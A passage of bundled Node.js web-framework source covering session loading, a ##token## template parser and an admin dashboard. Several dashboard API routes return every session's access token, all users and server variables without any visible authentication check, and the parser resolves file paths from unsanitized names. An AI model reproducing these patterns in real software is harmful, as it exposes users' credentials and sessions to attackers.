        if (session.user_id && userCacheFresh) {
            req.features.push('login');
            callback(session);
            session.$save();
        } else if (session.user_id) {
            ____0.security.getUser({ id: session.user_id }, function (err, user) {
                if (!err && user) {
                    req.features.push('login');
                    session.user = user;
                    session.$userLoadedAt = Date.now();
                } else {
                    session.user = null;
                    session.user_id = null;
                    session.$userLoadedAt = 0;
                }
                callback(session);
                session.$save();
            });
        } else if (session.user) {
            if (userCacheFresh) {
                req.features.push('login');
                callback(session);
                session.$save();
            } else {
                ____0.security.getUser({ email: session.user.email }, function (err, user) {
                    if (!err && user) {
                        req.features.push('login');
                        session.user_id = user.id;
                        session.user = user;
                        session.$userLoadedAt = Date.now();
                    } else {
                        session.user = null;
                        session.user_id = null;
                        session.$userLoadedAt = 0;
                    }
                    callback(session);
                    session.$save();
                });
            }
        } else {
            callback(session);
            session.$save();
        }
    });
};

return module.exports; })();

const parser = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(req, res, ____0, route) {
    req.features = req.features || [];

    let parser = {};

    function renderVar(v) {
        if (v && v == '*') {
            return JSON.stringify(____0.var);
        }
        return ____0.var(v);
    }

    function renderParam(v) {
        if (typeof req.paramsRaw[v] !== undefined) {
            if (v && v == '*') {
                return JSON.stringify(req.paramsRaw);
            }
            return req.paramsRaw[v];
        }

        return ' ';
    }

    function renderQuery(v) {
        if (typeof req.queryRaw[v] !== undefined) {
            if (v && v == '*') {
                return JSON.stringify(req.queryRaw);
            }
            return req.queryRaw[v];
        }
        return ' ';
    }

    function renderData(d) {
        if (!d) {
            return '';
        }
        let hide = false;
        let out = '';

        if (d.indexOf('#') == 0) {
            d = d.replace('#', '');
            hide = true;
        }

        if (d == '*') {
            out = JSON.stringify(req.data);
        } else if (d) {
            let v = d.split('.');

            if (v.length > 0) {
                out = req.data[v[0]];
            }

            if (v.length > 1 && out) {
                out = out[v[1]];
            }

            if (v.length > 2 && out) {
                out = out[v[2]];
            }

            if (v.length > 3 && out) {
                out = out[v[3]];
            }

            if (v.length > 4 && out) {
                out = out[v[4]];
            }

            if (v.length > 5 && out) {
                out = out[v[5]];
            }
        }

        if (hide) {
            out = ____0.hide(out);
        } else {
            if (typeof out === 'object') {
                out = ____0.toJson(out);
            }
        }

        return out ?? '';
    }

    function renderUser(v) {
        if (!v) {
            return '';
        }

        let user = req.session.user;
        if (user) {
            let hide = false;
            let out = '';
            if (v.indexOf('#') == 0) {
                v = v.replace('#', '');
                hide = true;
            }
            if (v == '*') {
                out = JSON.stringify(user);
            } else {
                v = v.split('.');

                if (v.length > 0) {
                    out = user[v[0]];
                }

                if (v.length > 1 && out) {
                    out = out[v[1]];
                }

                if (v.length > 2 && out) {
                    out = out[v[2]];
                }

                if (v.length > 3 && out) {
                    out = out[v[3]];
                }

                if (v.length > 4 && out) {
                    out = out[v[4]];
                }

                if (v.length > 5 && out) {
                    out = out[v[5]];
                }
            }

            if (typeof out === 'object') {
                out = ____0.toJson(out);
            }

            if (hide) {
                out = ____0.hide(out);
            } else {
                if (typeof out === 'object') {
                    out = ____0.toJson(out);
                }
                if (typeof out === 'undefined') {
                    out = '';
                }
            }
            return out;
        }

        return '';
    }

    function render_site(v) {
        if (!v) {
            return '';
        }
        let hide = false;
        let out = '';
        if (v.indexOf('#') == 0) {
            v = v.replace('#', '');
            hide = true;
        }
        if (v == '*') {
            out = JSON.stringify(____0);
        } else {
            v = v.split('.');

            if (v.length > 0) {
                out = ____0[v[0]];
            }

            if (v.length > 1 && out) {
                out = out[v[1]];
            }

            if (v.length > 2 && out) {
                out = out[v[2]];
            }

            if (v.length > 3 && out) {
                out = out[v[3]];
            }

            if (v.length > 4 && out) {
                out = out[v[4]];
            }

            if (v.length > 5 && out) {
                out = out[v[5]];
            }
        }

        if (typeof out === 'object') {
            out = ____0.toJson(out);
        }

        if (hide) {
            out = ____0.hide(out);
        } else {
            if (typeof out === 'object') {
                out = ____0.toJson(out);
            }
        }
        return out;
    }

    function renderSetting(v) {
        if (v && v == '*') {
            return JSON.stringify(____0.setting);
        } else {
            return render_site('setting.' + v);
        }
    }
    function renderRequest(v) {
        if (!v) {
            return '';
        }
        let hide = false;
        let out = '';
        if (v.indexOf('#') == 0) {
            v = v.replace('#', '');
            hide = true;
        }
        if (v == '*') {
            out = JSON.stringify(req);
        } else {
            v = v.split('.');

            if (v.length > 0) {
                out = req[v[0]];
            }

            if (v.length > 1 && out) {
                out = out[v[1]];
            }

            if (v.length > 2 && out) {
                out = out[v[2]];
            }

            if (v.length > 3 && out) {
                out = out[v[3]];
            }

            if (v.length > 4 && out) {
                out = out[v[4]];
            }

            if (v.length > 5 && out) {
                out = out[v[5]];
            }
        }

        if (hide) {
            out = ____0.hide(out);
        } else {
            if (typeof out === 'object') {
                out = ____0.toJson(out);
            }
        }
        return typeof out !== 'undefined' ? out : '';
    }

    function renderSession(v) {
        if (v && v == '*') {
            return JSON.stringify({
                accessToken: req.session.accessToken,
                createdTime: req.session.createdTime,
                modifiedTime: req.session.modifiedTime,
                data: req.session.data,
                requestesCount: req.session.requestesCount,
                busy: req.session.$busy,
                ip: req.session.ip,
            });
        }
        if (v == 'lang') {
            return req.session.language.id;
        } else if (v == 'theme') {
            return req.session.theme;
        } else {
            v = v.split('.');
            if (v.length === 1) {
                return req.session[v[0]];
            }
            if (v.length === 2) {
                let s1 = req.session[v[0]];
                if (s1) {
                    return s1[v[1]];
                } else {
                    return '';
                }
            }
        }
    }

    function renderJson(name) {
        return ____0.readFileSync(route.parserDir + '/json/' + name + '.json');
    }

    function renderWord(name) {
        return req.word(name);
    }

    function getContent(name) {
        let path = null;
        let hide = false;
        if (name.startsWith('#')) {
            hide = true;
            name = name.replace('#', '');
        }
        let dir = route.parserDir;
        if (dir.contain('site_files')) {
            dir = ____0.path.dirname(dir);
        }

        if (true) {
            let arr = name.split('/');

            if (arr.length === 1) {
                path = ____0.path.join(dir, 'site_files', ____0.path.extname(arr[0]).replace('.', ''), arr[0]);
            } else if (arr.length === 2) {
                path = ____0.path.join(dir, 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[0], arr[1]);
            } else if (arr.length === 3) {
                path = ____0.path.join(dir, 'site_files', ____0.path.extname(arr[2]).replace('.', ''), arr[0], arr[1], arr[2]);
            }
        }

        if (!path || !____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length === 1) {
                path = ____0.path.join(____0.path.dirname(route.parserDir), 'site_files', ____0.path.extname(arr[0]).replace('.', ''), arr[0]);
            } else if (arr.length === 2) {
                path = ____0.path.join(____0.path.dirname(route.parserDir), 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[0], arr[1]);
            } else if (arr.length === 3) {
                path = ____0.path.join(____0.path.dirname(route.parserDir), 'site_files', ____0.path.extname(arr[2]).replace('.', ''), arr[0], arr[1], arr[2]);
            }
        }

        if (!____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length === 1) {
                path = ____0.path.join(route.parserDir, arr[0]);
            } else if (arr.length === 2) {
                path = ____0.path.join(____0.path.dirname(route.parserDir), 'apps', arr[0], 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[1]);
            } else if (arr.length === 3) {
                path = ____0.path.join(____0.path.dirname(route.parserDir), 'apps', arr[0], 'site_files', ____0.path.extname(arr[2]).replace('.', ''), arr[1], arr[2]);
            }
        }

        if (!____0.isFileExistsSync(path)) {
            let arr = name.split('/');
            if (arr.length > 1) {
                ____0.apps.forEach((ap) => {
                    if (arr.length === 2 && ap.name == arr[0]) {
                        path = ____0.path.join(ap.path, 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[1]);
                    } else if (arr.length === 2 && ap.name2 == arr[0]) {
                        path = ____0.path.join(ap.path, 'site_files', ____0.path.extname(arr[1]).replace('.', ''), arr[1]);
                    } else if (arr.length === 3 && ap.name == arr[0]) {
                        path = ____0.path.join(ap.path, 'site_files', ____0.path.extname(arr[2]).replace('.', ''), arr[1], arr[2]);
                    }
                });
            }
        }

        if (!____0.isFileExistsSync(path)) {
            ____0.log(path, 'PATH NOT EXISTS parser.getContent()');
            return '';
        }

        if (name.endsWith('.content.html')) {
            let txt = ____0.readFileSync(path);
            return txt;
        } else if (name.endsWith('.html')) {
            let txt = ____0.readFileSync(path);
            let $ = ____0.$.load(txt, null, false);
            $ = renderHtml($);
            if (hide) {
                return ____0.hide($.html());
            }
            return $.html();
        } else if (name.endsWith('.js')) {
            let txt = ____0.readFileSync(path);
            txt = parser.js(txt);
            if (hide) {
                txt = ____0.hide(txt);
            }
            return txt;
        } else if (name.endsWith('.css')) {
            let txt = ____0.readFileSync(path);
            txt = parser.css(txt);
            return txt;
        } else {
            let txt = ____0.readFileSync(path);
            if (hide) {
                txt = ____0.hide(txt);
            }
            return txt;
        }
    }

    function handleXList1($, el, data) {
        let property = $(el).attr('x-list1').split('.');
        $(el).removeAttr('x-list1');
        let list = null;
        let html2 = '';
        if (property.length > 0) {
            if (property[0] == '*') {
                list = data;
            } else {
                list = data[property[0]];
            }
        }
        if (list && property.length > 1) {
            list = list[property[1]];
        }
        if (list && property.length > 2) {
            list = list[property[2]];
        }
        if (Array.isArray(list)) {
            let matches = $.html(el).match(/##item1.*?##/g);
            list.forEach((item, i) => {
                $(el).attr('x-item1', i);
                let _html = $.html(el);
                if (matches) {
                    for (let i = 0; i < matches.length; i++) {
                        let p = matches[i].replace('##item1.', '').replace('##', '').split('.');
                        let v = null;
                        if (p.length > 0) {
                            if (p[0] == '*' || !p[0]) {
                                v = item;
                            } else {
                                v = item[p[0]];
                            }
                        }
                        if (p.length > 1 && v) {
                            v = v[p[1]];
                        }
                        if (p.length > 2 && v) {
                            v = v[p[2]];
                        }

                        _html = _html.replace(matches[i], v ?? '');
                    }
                }
                let $2 = ____0.$.load(_html);
                $2('[x-show-item1]').each(function (i, elem) {
                    let property = $(elem).attr('x-show-item1').split('.');
                    let out = null;
                    if (property.length > 0) {
                        if (property.length > 0) {
                            out = item[property[0]];
                        }

                        if (property.length > 1 && out) {
                            out = out[property[1]];
                        }

                        if (property.length > 2 && out) {
                            out = out[property[2]];
                        }

                        if (property.length > 3 && out) {
                            out = out[property[3]];
                        }

                        if (property.length > 4 && out) {
                            out = out[property[4]];
                        }

                        if (property.length > 5 && out) {
                            out = out[property[5]];
                        }
                    }
                    if (!out) {
                        $(this).remove();
                    } else {
                        $(this).removeAttr('x-show-item1');
                    }
                });
                $2('[x-list2]').each(function (i2, elem2) {
                    $(handleXList2($2, elem2, item)).insertAfter($(this));
                    $(this).remove();
                });
                html2 += $2.html();
            });
        }

        return html2;
    }

    function handleXList2($, el, data) {
        let property = $(el).attr('x-list2').split('.');
        $(el).removeAttr('x-list2');
        let list = null;
        let html2 = '';
        if (property.length > 0) {
            if (property[0] == '*') {
                list = data;
            } else {
                list = data[property[0]];
            }
        }
        if (list && property.length > 1) {
            list = list[property[1]];
        }
        if (Array.isArray(list)) {
            let matches = $.html(el).match(/##item2.*?##/g);
            list.forEach((item, i) => {
                $(el).attr('x-item2', i);
                let _html = $.html(el);
                if (matches) {
                    for (let i = 0; i < matches.length; i++) {
                        let p = matches[i].replace('##item2.', '').replace('##', '').split('.');
                        let v = null;
                        if (p.length > 0) {
                            if (p[0] == '*' || !p[0]) {
                                v = item;
                            } else {
                                v = item[p[0]];
                            }
                        }
                        if (p.length > 1 && v) {
                            v = v[p[1]];
                        }
                        if (p.length > 2 && v) {
                            v = v[p[2]];
                        }
                        _html = _html.replace(matches[i], v ?? '');
                    }
                }
                let $2 = ____0.$.load(_html);
                $2('[x-show-item2]').each(function (i, elem) {
                    let property = $(elem).attr('x-show-item2').split('.');
                    let out = null;
                    if (property.length > 0) {
                        if (property.length > 0) {
                            out = item[property[0]];
                        }

                        if (property.length > 1 && out) {
                            out = out[property[1]];
                        }

                        if (property.length > 2 && out) {
                            out = out[property[2]];
                        }

                        if (property.length > 3 && out) {
                            out = out[property[3]];
                        }

                        if (property.length > 4 && out) {
                            out = out[property[4]];
                        }

                        if (property.length > 5 && out) {
                            out = out[property[5]];
                        }
                    }
                    if (!out) {
                        $(this).remove();
                    } else {
                        $(this).removeAttr('x-show-item2');
                    }
                });
                html2 += $2.html();
            });
        }
        return html2;
    }

    function renderHtml($, log) {
        $('[x-setting]').each(function (i, elem) {
            let property = $(elem).attr('x-setting').split('.');
            let out = null;
            if (property.length > 0) {
                if (property.length > 0) {
                    out = ____0.setting[property[0]];
                }

                if (property.length > 1 && out) {
                    if (out) {
                        out = out[property[1]];
                    } else {
                        out = null;
                    }
                }
                if (property.length > 2 && out) {
                    if (out) {
                        out = out[property[2]];
                    } else {
                        out = null;
                    }
                }
                if (property.length > 3 && out) {
                    if (out) {
                        out = out[property[3]];
                    } else {
                        out = null;
                    }
                }
                if (property.length > 4 && out) {
                    if (out) {
                        out = out[property[4]];
                    } else {
                        out = null;
                    }
                }
            }
            if (!out) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-setting');
            }
        });

        $('[x-data]').each(function (i, elem) {
            let property = $(elem).attr('x-data').split('.');
            let out = null;
            if (property.length > 0) {
                if (property.length > 0) {
                    out = req.data[property[0]];
                }

                if (property.length > 1 && out) {
                    if (out) {
                        out = out[property[1]];
                    } else {
                        out = null;
                    }
                }
                if (property.length > 2 && out) {
                    if (out) {
                        out = out[property[2]];
                    } else {
                        out = null;
                    }
                }
                if (property.length > 3 && out) {
                    if (out) {
                        out = out[property[3]];
                    } else {
                        out = null;
                    }
                }
                if (property.length > 4 && out) {
                    if (out) {
                        out = out[property[4]];
                    } else {
                        out = null;
                    }
                }
            }
            if (!out) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-data');
            }
        });

        $('[x-permission]').each(function (i, elem) {
            if (!____0.security.isUserHasPermission(req, res, $(this).attr('x-permission'))) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-permission');
            }
        });

        $('[x-role]').each(function (i, elem) {
            if (!____0.security.isUserHasRole(req, res, $(this).attr('x-role'))) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-role');
            }
        });

        $('[x-permissions]').each(function (i, elem) {
            if (!____0.security.isUserHasPermissions(req, res, $(this).attr('x-permissions'))) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-permissions');
            }
        });

        $('[x-roles]').each(function (i, elem) {
            if (!____0.security.isUserHasRoles(req, res, $(this).attr('x-roles'))) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-roles');
            }
        });

        $('[x-lang]').each(function (i, elem) {
            if ($(this).attr('x-lang') !== req.session.language.id) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-lang');
            }
        });

        $('[x-feature]').each(function (i, elem) {
            let f = $(this).attr('x-feature');
            let not = !1;
            if (f.startsWith('!')) {
                f = f.replace('!', '');
                not = !0;
            }
            if (!req.hasFeature(f) && !not) {
                $(this).remove();
            } else if (req.hasFeature(f) && not) {
                $(this).remove();
            } else {
                $(this).removeAttr('x-feature');
            }
        });

        $('[x-features]').each(function (i, elem) {
            let fs = $(this).attr('x-features');
            if (fs.indexOf('||') > -1) {
                let del = !0;
                fs.split('||').forEach((f) => {
                    f = f.trim();
                    let not = !1;
                    if (f.startsWith('!')) {
                        f = f.replace('!', '');
                        not = !0;
                    }
                    if (req.hasFeature(f) && !not) {
                        del = !1;
                    }
                    if (!req.hasFeature(f) && not) {
                        del = !1;
                    }
                });

                if (del) {
                    $(this).remove();
                }
            } else if (fs.indexOf('&&') > -1) {
                let ok_list = [];
                fs.split('&&').forEach((f) => {
                    f = f.trim();
                    let d = !0;
                    if (f.startsWith('!')) {
                        f = f.replace('!', '');
                        d = !1;
                    }
                    if (!req.hasFeature(f) && !d) {
                        ok_list.push({});
                    }
                    if (req.hasFeature(f) && d) {
                        ok_list.push({});
                    }
                });
                if (ok_list.length !== fs.split('&&').length) {
                    $(this).remove();
                }
            } else {
                f = fs.trim();
                let d = !0;
                if (f.startsWith('!')) {
                    f = f.replace('!', '');
                    d = !1;
                }
                if (!req.hasFeature(f) && d) {
                    $(this).remove();
                }
                if (req.hasFeature(f) && !d) {
                    $(this).remove();
                }
            }
        });

        if (route.parser.like('*css*')) {
            $('style').each(function (i, elem) {
                $(this).html(parser.css($(this).html()));
            });
        }

        if (route.parser.like('*js*')) {
            $('script').each(function (i, elem) {
                $(this).html(parser.js($(this).html()));
            });
        }

        $($('[x-import]').get().reverse()).each(function (i, elem) {
            let file = $(this).attr('x-import');
            if (file.endsWith('.html')) {
                $(this).html(getContent(file) + $(this).html());
            } else if (file.endsWith('.css')) {
                $(this).text(getContent(file) + $(this).html());
            } else {
                $(this).text(getContent(file) + $(this).text());
            }
            $(this).removeAttr('x-import');
        });

        $($('[x-append]').get().reverse()).each(function (i, elem) {
            let file = $(this).attr('x-append');
            $(this).removeAttr('x-append');
            if (file.endsWith('.html')) {
                $(this).html($(this).html() + getContent(file));
            } else if (file.endsWith('.css')) {
                $(this).text($(this).html() + getContent(file));
            } else {
                $(this).text($(this).text() + getContent(file));
            }
            $(this).removeAttr('x-append');
        });

        $($('[x-replace]').get().reverse()).each(function (i, elem) {
            let file = $(this).attr('x-replace');

            $(getContent(file)).insertAfter($(this));
            $(this).remove();

            $(this).removeAttr('x-replace');
        });

        $('[x-list1]').each(function (i, elem) {
            $(handleXList1($, elem, req.data)).insertAfter($(this));
            $(this).remove();
        });
        $('[x-list2]').each(function (i, elem) {
            $(handleXList2($, elem, req.data)).insertAfter($(this));
            $(this).remove();
        });
        return $;
    }

    parser.handleMatches = function (txt) {
        let matches = txt.match(/##.*?##/g);
        let handled = false;
        if (matches) {
            for (let i = 0; i < matches.length; i++) {
                let v = matches[i];

                if (v.startsWith('##var.')) {
                    v = v.replace('##var.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderVar(v));
                    handled = true;
                } else if (v.startsWith('##user.')) {
                    v = v.replace('##user.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderUser(v));
                    handled = true;
                } else if (v.startsWith('##site.')) {
                    v = v.replace('##site.', '').replace('##', '');
                    txt = txt.replace(matches[i], render_site(v));
                    handled = true;
                } else if (v.startsWith('##req.')) {
                    v = v.replace('##req.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderRequest(v));
                    handled = true;
                } else if (v.startsWith('##session.')) {
                    v = v.replace('##session.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderSession(v));
                    handled = true;
                } else if (v.startsWith('##json.')) {
                    v = v.replace('##json.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderJson(v));
                    handled = true;
                } else if (v.startsWith('##setting.')) {
                    v = v.replace('##setting.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderSetting(v));
                    handled = true;
                } else if (v.startsWith('##params.')) {
                    v = v.replace('##params.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderParam(v));
                    handled = true;
                } else if (v.startsWith('##query.')) {
                    v = v.replace('##query.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderQuery(v));
                    handled = true;
                } else if (v.startsWith('##data.')) {
                    v = v.replace('##data.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderData(v));
                    handled = true;
                } else if (v.startsWith('##word.')) {
                    v = v.replace('##word.', '').replace('##', '');
                    txt = txt.replace(matches[i], renderWord(v));
                    handled = true;
                } else {
                }
            }
        }
        if (handled) {
            txt = parser.handleMatches(txt);
        }
        return txt;
    };

    parser.html = function (content) {
        let $ = ____0.$.load(content);
        $ = renderHtml($);
        const txt = parser.handleMatches($.html());
        return txt;
    };
    parser.txt = function (content) {
        content = parser.handleMatches(content);
        return content;
    };

    parser.js = function (content) {
        let matches = content.match(/\/\*##.*?\*\//g);
        if (matches) {
            for (let i = 0; i < matches.length; i++) {
                let v = matches[i];
                v = v.replace('/*##', '').replace('*/', '');
                content = content.replace(matches[i], getContent(v));
            }
        }
        content = parser.handleMatches(content);
        return content;
    };

    parser.css = function (content) {
        content = parser.handleMatches(content);

        let matches = content.match(/var\(---.*?\)/g);
        if (matches) {
            for (let i = 0; i < matches.length; i++) {
                let v = matches[i];

                v = v.replace('var(---', '').replace(')', '');
                content = content.replace(matches[i], renderVar(v));
            }
        }

        let matches2 = content.match(/word\(---.*?\)/g);
        if (matches2) {
            for (let i = 0; i < matches2.length; i++) {
                let v = matches2[i];

                v = v.replace('word(---', '').replace(')', '');
                content = content.replace(matches2[i], renderWord(v));
            }
        }

        return content;
    };

    parser.json = function (content) {
        return content;
    };

    parser.renderHtml = renderHtml;
    return parser;
};

return module.exports; })();

const dashboard = (() => { const module = { exports: {} }; const exports = module.exports;
module.exports = function init(____0) {
  let dir = __dirname + '/../isite_files';

  ____0.get({
    name: '/x-dashboard-admin',
    path: dir + '/html/index.html',
    parser: 'html',
    parserDir: dir,
    hide: !0,
  });
  ____0.get({
    name: '/x-dashboard-images',
    path: dir + '/images',
    hide: !0,
  });
  ____0.get({
    name: '/x-dashboard-fonts',
    path: dir + '/fonts',
    hide: !0,
  });
  ____0.get({
    name: '/x-dashboard-js',
    path: dir + '/js',
    hide: !0,
  });
  ____0.get({
    name: '/x-dashboard-css',
    path: dir + '/css',
    compress: !0,
    hide: !0,
  });
  ____0.get({
    name: '/x-dashboard-css/bootstrap3.css',
    path: [dir + '/css/bootstrap.css', dir + '/css/navbar.css'],
    compress: !0,
    hide: !0,
  });
  ____0.get({
    name: '/x-dashboard-js/bootstrap3.js',
    path: dir + '/js/bootstrap.js',
    hide: !0,
  });

  ____0.get({
    name: '/x-dashboard-js/script.js',
    hide: !0,
    compress: !0,
    path: [dir + '/js/jquery.js', dir + '/js/bootstrap.js', dir + '/js/angular.js', dir + '/js/prism.js', dir + '/js/client.js'],
  });
  ____0.get({
    name: '/x-dashboard-css/style.css',
    hide: !0,
    compress: !0,
    path: [dir + '/css/bootstrap.css', dir + '/css/font-awesome.css', dir + '/css/navbar.css', dir + '/css/custom.css', dir + '/css/prism.css'],
  });

  ____0.all({
    name: '/x-dashboard-admin/api/vars',
    hide: !0,
    callback: function (req, res) {
      res.setHeader('x-dashboard-content', 'from x-dashboard-server');
      res.setHeader('Content-Type', 'application/json');
      res.writeHeader(200);
      res.end(JSON.stringify(____0.vars));
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/routes',
    hide: !0,
    callback: function (req, res) {
      res.setHeader('x-dashboard-content', 'from x-dashboard-server');
      res.setHeader('Content-Type', 'application/json');
      res.writeHeader(200);
      var arr = [];
      for (var i = 0; i < ____0.routeList.length; i++) {
        var r = ____0.routeList[i];
        if (!r.hide) {
          arr.push({
            name: r.name,
            path: r.path,
            method: r.method,
            count: r.count,
          });
        }
      }
      res.end(JSON.stringify(arr));
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/session',
    hide: !0,
    callback: function (req, res) {
      res.htmlContent(____0.toHtmlTable(req.session));
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/sessions',
    hide: !0,
    callback: function (req, res) {
      res.setHeader('x-dashboard-content', 'from x-dashboard-server');
      res.setHeader('Content-Type', 'application/json');
      res.writeHeader(200);
      var arr = [];
      for (var i = 0; i < ____0.sessions.length; i++) {
        var s = ____0.sessions[i];
        arr.push({
          ip: s.ip,
          user_id: s.user_id,
          modifiedTime: s.modifiedTime,
          accessToken: s.accessToken,
          createdTime: s.createdTime,
          requestesCount: s.requestesCount,
        });
      }
      res.end(JSON.stringify(arr));
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/cookie',
    hide: !0,
    callback: function (req, res) {
      res.setHeader('x-dashboard-content', 'from x-dashboard-server');
      res.setHeader('Content-Type', 'application/json');
      res.writeHeader(200);
      res.end(JSON.stringify(req.cookie));
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/users',
    hide: !0,
    callback: function (req, res) {
      res.set('x-dashboard-content', 'from x-dashboard-server');
      res.set('Content-Type', 'application/json');
      res.json(____0.security.users);
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/user',
    hide: !0,
    callback: function (req, res) {
      res.set('x-dashboard-content', 'from x-dashboard-server');
      res.set('Content-Type', 'application/json');
      res.json(req.session.user);
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api/files',
    hide: !0,
    callback: function (req, res) {
      res.setHeader('x-dashboard-content', 'from x-dashboard-server');
      res.setHeader('Content-Type', 'application/json');
      res.writeHeader(200);
      var arr = [];
      for (var i = 0; i < ____0.fsm.list.length; i++) {
        var f = ____0.fsm.list[i];
        arr.push({
          path: f.path,
          count: f.count,
        });
      }
      res.end(JSON.stringify(arr));
    },
  });

  ____0.all({
    name: '/x-dashboard-admin/api*',
    hide: !0,
    callback: function (req, res) {
      res.setHeader('x-dashboard-content', 'from x-dashboard-server');
      res.setHeader('Content-Type', 'application/json');
      res.writeHeader(200);
      res.end(JSON.stringify('USING BY BUILTIN ROUTING !! '));
    },
  });

  ____0.post('/x-dashboard-Language/Change', function (req, res) {
    let name = req.body.name || 'Ar';
    req.session.language = req.body;
    req.session.lang = req.session.language.id || name;
    req.session.$save();
    res.ending(0, JSON.stringify({ done: !0 }));
  });
};

return module.exports; })();

module.exports = { data, fsm, routing, vars, mongodb, words, storage, logs, ws, wsClient, email, integrated, browser, helper, pdf, app, evalMod, proxy, sessions, cookie, session, parser, dashboard };
